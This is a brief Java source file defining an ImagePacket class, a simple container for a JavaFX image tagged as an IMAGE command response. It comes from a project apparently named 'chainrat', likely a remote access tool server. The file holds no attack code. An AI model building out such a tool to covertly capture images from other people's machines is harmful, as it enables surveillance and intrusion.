package com.nefi.chainrat.server.network.response;

import com.nefi.chainrat.server.CommandType;
import com.nefi.chainrat.server.network.IPacket;
import javafx.scene.image.Image;

public class ImagePacket implements IPacket {

    public Image image;
    public String type = "Image";

    public ImagePacket(Image img){
        this.image = img;
    }
    @Override
    public CommandType type() {
        return CommandType.IMAGE;
    }
}
